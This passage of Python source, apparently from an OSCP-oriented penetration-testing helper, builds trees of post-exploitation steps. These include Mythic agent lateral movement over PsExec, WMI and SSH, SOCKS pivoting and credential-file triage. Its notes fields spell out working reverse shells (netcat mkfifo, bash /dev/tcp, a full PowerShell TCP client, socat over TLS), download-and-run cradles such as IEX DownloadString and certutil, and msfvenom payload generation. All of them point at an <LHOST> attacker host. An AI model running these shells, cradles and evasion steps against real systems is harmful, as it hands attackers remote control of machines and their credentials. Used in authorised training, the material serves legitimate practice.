                                        'notes': 'Creates service on remote host to execute agent',
                                        'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT', 'NOISY']
                                    }
                                },
                                {
                                    'id': f'apollo-jump-wmi-{target}',
                                    'name': 'WMI Lateral Movement',
                                    'type': 'command',
                                    'metadata': {
                                        'command': 'jump_wmi target-host listener',
                                        'description': 'Lateral movement via WMI',
                                        'notes': 'More stealthy than PsExec, uses WMI to execute agent',
                                        'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT', 'STEALTH']
                                    }
                                },
                                {
                                    'id': f'apollo-socks-{target}',
                                    'name': 'SOCKS Proxy',
                                    'type': 'command',
                                    'metadata': {
                                        'command': 'socks',
                                        'description': 'Start SOCKS5 proxy for tunneling',
                                        'notes': 'Compatible with proxychains. Use for accessing internal network.',
                                        'tags': ['OSCP:HIGH', 'PIVOTING']
                                    }
                                }
                            ]
                        },
                        {
                            'id': f'apollo-forge-{target}',
                            'name': 'Mythic Forge (BOF/COFF)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Load Beacon Object Files from Mythic Forge for stealthy execution',
                                'command': 'forge_collections {"collectionName":"SharpCollection"}',
                                'notes': '''
Mythic Forge:
- Repository of pre-compiled BOFs and COFFs
- Execute in current agent process (more stealthy than execute_assembly)
- Reduces IOCs from process injection

Setup:
1. Install: ./mythic-cli install github https://github.com/MythicAgents/forge.git
2. Load collections: forge_collections {"collectionName":"SharpCollection"}
3. Execute: forge_bof_sa-whoami

Default Collections:
- SharpCollection
- SliverArmory

OPSEC: BOFs run in-process, avoiding fork-and-run behavior
''',
                                'alternatives': [
                                    'Cobalt Strike BOFs',
                                    'Execute assemblies (noisier)',
                                    'Native Windows commands'
                                ],
                                'tags': ['OSCP:MEDIUM', 'STEALTH', 'OPSEC']
                            }
                        }
                    ]
                },

                # Poseidon Agent (Linux/macOS)
                {
                    'id': f'mythic-poseidon-{target}',
                    'name': 'Poseidon Agent (Linux/macOS)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'poseidon-ssh-{target}',
                            'name': 'SSH Lateral Movement',
                            'type': 'command',
                            'metadata': {
                                'command': 'ssh target-host user password',
                                'description': 'SSH to target host and open PTY without spawning ssh binary',
                                'notes': 'Avoids leaving ssh process artifacts. Integrated SSH client in agent.',
                                'alternatives': [
                                    'sshauth: SSH with command execution or SCP',
                                    'Manual: ssh user@target',
                                    'link_tcp: Link to another agent over TCP'
                                ],
                                'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT', 'LINUX']
                            }
                        },
                        {
                            'id': f'poseidon-pty-{target}',
                            'name': 'Interactive PTY',
                            'type': 'command',
                            'metadata': {
                                'command': 'pty',
                                'description': 'Open interactive pseudo-terminal',
                                'notes': 'Full shell interaction with tab completion and job control',
                                'alternatives': [
                                    'shell: Execute single command',
                                    'Manual: python -c "import pty;pty.spawn(\'/bin/bash\')"'
                                ],
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'LINUX']
                            }
                        },
                        {
                            'id': f'poseidon-socks-{target}',
                            'name': 'SOCKS Proxy',
                            'type': 'command',
                            'metadata': {
                                'command': 'socks',
                                'description': 'Start SOCKS5 proxy for pivoting',
                                'notes': 'Use with proxychains to access internal network',
                                'tags': ['OSCP:HIGH', 'PIVOTING', 'LINUX']
                            }
                        },
                        {
                            'id': f'poseidon-triage-{target}',
                            'name': 'Triage Directory (Find Sensitive Files)',
                            'type': 'command',
                            'metadata': {
                                'command': 'triagedirectory /home/user',
                                'description': 'Search for interesting files (credentials, keys, configs)',
                                'flag_explanations': {
                                    'triagedirectory': 'Automated sensitive file discovery',
                                    '/home/user': 'Directory to search'
                                },
                                'notes': '''
Searches for:
- SSH keys (~/.ssh/id_rsa)
- Bash history (~/.bash_history)
- Configuration files
- Credential files
- Database files
''',
                                'alternatives': [
                                    'Manual: find / -name "*.key" 2>/dev/null',
                                    'Manual: find / -name "*password*" 2>/dev/null',
                                    'LinPEAS.sh automated enumeration'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'LINUX']
                            }
                        }
                    ]
                }
            ]
        }

    def _get_manual_c2_alternatives(self, target: str) -> Dict[str, Any]:
        """Manual C2 alternatives when commercial frameworks unavailable"""
        return {
            'id': f'manual-c2-{target}',
            'name': 'Manual C2 Alternatives',
            'type': 'parent',
            'children': [
                {
                    'id': f'netcat-reverse-{target}',
                    'name': 'Netcat Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'nc -lvnp 4444',
                        'description': 'Simple netcat listener for reverse shells (OSCP staple)',
                        'flag_explanations': {
                            '-l': 'Listen mode',
                            '-v': 'Verbose output',
                            '-n': 'No DNS resolution (faster)',
                            '-p 4444': 'Port to listen on'
                        },
                        'notes': '''
Victim Commands:
- Windows: nc.exe <LHOST> 4444 -e cmd.exe
- Linux: nc <LHOST> 4444 -e /bin/bash
- No -e: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f

Upgrade TTY (Linux):
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
''',
                        'alternatives': [
                            'socat: socat TCP-LISTEN:4444 STDOUT',
                            'PowerShell reverse shell',
                            'Bash reverse shell: bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN']
                    }
                },
                {
                    'id': f'powershell-reverse-{target}',
                    'name': 'PowerShell Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'nc -lvnp 4444',
                        'description': 'PowerShell reverse shell (no tools required)',
                        'notes': '''
PowerShell One-Liner (Base64 encoded):
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Execute:
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"

Or base64 encoded:
powershell -nop -exec bypass -enc <BASE64_PAYLOAD>
''',
                        'alternatives': [
                            'Nishang Invoke-PowerShellTcp.ps1',
                            'PowerCat (PowerShell netcat)',
                            'Metasploit: windows/shell_reverse_tcp'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'POWERSHELL']
                    }
                },
                {
                    'id': f'metasploit-handler-{target}',
                    'name': 'Metasploit Multi Handler',
                    'type': 'command',
                    'metadata': {
                        'command': 'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST <LHOST>; set LPORT 443; exploit"',
                        'description': 'Metasploit listener for catching reverse shells',
                        'flag_explanations': {
                            'use exploit/multi/handler': 'Generic payload handler',
                            'set payload': 'Specify payload type',
                            'set LHOST': 'Local listener IP (attacker)',
                            'set LPORT': 'Local listener port',
                            'exploit': 'Start listener'
                        },
                        'notes': '''
Generate Payload:
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe -o shell.exe

Common Payloads:
- windows/meterpreter/reverse_tcp
- windows/meterpreter/reverse_https (OPSEC)
- linux/x64/meterpreter/reverse_tcp
- windows/shell_reverse_tcp (non-meterpreter)

Meterpreter Commands:
- sysinfo, getuid, ps
- upload, download
- hashdump (requires SYSTEM)
- shell (drop to shell)
''',
                        'alternatives': [
                            'Netcat listener',
                            'Cobalt Strike listener',
                            'Socat listener'
                        ],
                        'tags': ['OSCP:HIGH', 'METASPLOIT']
                    }
                },
                {
                    'id': f'python-http-server-{target}',
                    'name': 'Python HTTP Server (File Transfer)',
                    'type': 'command',
                    'metadata': {
                        'command': 'python3 -m http.server 8000',
                        'description': 'Simple HTTP server for hosting files',
                        'flag_explanations': {
                            '-m http.server': 'Run HTTP server module',
                            '8000': 'Port to listen on (default: 8000)'
                        },
                        'notes': '''
Download from Victim:
- Windows: certutil.exe -urlcache -f http://<LHOST>:8000/file.exe file.exe
- Windows: powershell (New-Object Net.WebClient).DownloadFile("http://<LHOST>:8000/file.exe","C:\\temp\\file.exe")
- Linux: wget http://<LHOST>:8000/file
- Linux: curl http://<LHOST>:8000/file -o file

Python 2: python -m SimpleHTTPServer 8000
''',
                        'alternatives': [
                            'Impacket smbserver.py: smbserver.py share . -smb2support',
                            'Apache web server',
                            'PHP built-in server: php -S 0.0.0.0:8000'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'FILE_TRANSFER']
                    }
                },
                {
                    'id': f'bash-reverse-shell-{target}',
                    'name': 'Bash Reverse Shell (Linux)',
                    'type': 'command',
                    'metadata': {
                        'command': 'nc -lvnp 4444',
                        'description': 'Bash TCP reverse shell (works on most Linux systems)',
                        'flag_explanations': {
                            '-l': 'Listen mode',
                            '-v': 'Verbose output',
                            '-n': 'No DNS resolution',
                            '-p 4444': 'Port to listen on'
                        },
                        'notes': '''
Execute on victim:
bash -i >& /dev/tcp/<LHOST>/4444 0>&1

Alternative without /dev/tcp:
bash -c 'exec 5<>/dev/tcp/<LHOST>/4444;cat <&5|while read line;do $line 2>&5 >&5;done'

Stabilize shell:
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 columns 116
''',
                        'alternatives': [
                            'Python reverse shell: python -c "import socket,subprocess,os;s=socket.socket(...)"',
                            'Perl reverse shell',
                            'PHP reverse shell',
                            'Netcat with -e: nc <LHOST> 4444 -e /bin/bash'
                        ],
                        'success_indicators': [
                            'Shell prompt received',
                            'Commands execute successfully',
                            'TTY stabilized'
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'Firewall blocking outbound connections',
                            '/dev/tcp not available (use alternative)'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN', 'LINUX']
                    }
                },
                {
                    'id': f'smb-file-transfer-{target}',
                    'name': 'SMB File Transfer (Impacket smbserver)',
                    'type': 'command',
                    'metadata': {
                        'command': 'impacket-smbserver share . -smb2support',
                        'description': 'Host SMB share for file transfers to/from Windows targets',
                        'flag_explanations': {
                            'impacket-smbserver': 'Impacket SMB server tool',
                            'share': 'Share name',
                            '.': 'Current directory to share',
                            '-smb2support': 'Enable SMB2 protocol (required for modern Windows)'
                        },
                        'notes': '''
Execute on Windows victim:
- Copy from share: copy \\\\<LHOST>\\share\\file.exe C:\\temp\\file.exe
- Execute from share: \\\\<LHOST>\\share\\nc.exe <LHOST> 4444 -e cmd.exe
- List share: net view \\\\<LHOST>

With authentication:
impacket-smbserver share . -smb2support -username user -password pass

Mount on Linux:
mount -t cifs //<LHOST>/share /mnt -o username=user,password=pass
''',
                        'alternatives': [
                            'Python HTTP server',
                            'FTP server',
                            'WebDAV server',
                            'Native Windows file sharing'
                        ],
                        'success_indicators': [
                            'SMB server started successfully',
                            'Share accessible from Windows target',
                            'Files transfer successfully'
                        ],
                        'failure_indicators': [
                            'Port 445 blocked by firewall',
                            'SMB1 required (add -smb2support)',
                            'Authentication failed'
                        ],
                        'tags': ['OSCP:HIGH', 'FILE_TRANSFER', 'WINDOWS', 'QUICK_WIN']
                    }
                },
                {
                    'id': f'socat-shell-{target}',
                    'name': 'Socat Encrypted Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork STDOUT',
                        'description': 'Encrypted reverse shell using socat with SSL/TLS',
                        'flag_explanations': {
                            'OPENSSL-LISTEN:443': 'Listen on port 443 with SSL/TLS encryption',
                            'cert=server.pem': 'SSL certificate file',
                            'verify=0': 'Do not verify client certificate',
                            'fork': 'Handle multiple connections'
                        },
                        'notes': '''
Generate certificate:
openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
cat server.key server.crt > server.pem

Execute on victim (Linux):
socat OPENSSL:<LHOST>:443,verify=0 EXEC:/bin/bash

Execute on victim (Windows):
socat.exe OPENSSL:<LHOST>:443,verify=0 EXEC:'cmd.exe',pipes

Advantages:
- Encrypted traffic (bypasses basic traffic inspection)
- Appears as HTTPS traffic
- More stable than netcat
- TTY support: socat OPENSSL:<LHOST>:443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
''',
                        'alternatives': [
                            'Netcat with SSL: ncat --ssl -lvnp 443',
                            'SSH reverse tunnel',
                            'OpenSSL reverse shell',
                            'Metasploit reverse_https payload'
                        ],
                        'success_indicators': [
                            'Socat listener started',
                            'Client connects successfully',
                            'Encrypted shell established'
                        ],
                        'failure_indicators': [
                            'Certificate error',
                            'Socat not installed on victim',
                            'Port 443 blocked'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENCRYPTED', 'STEALTH', 'MANUAL']
                    }
                }
            ]
        }
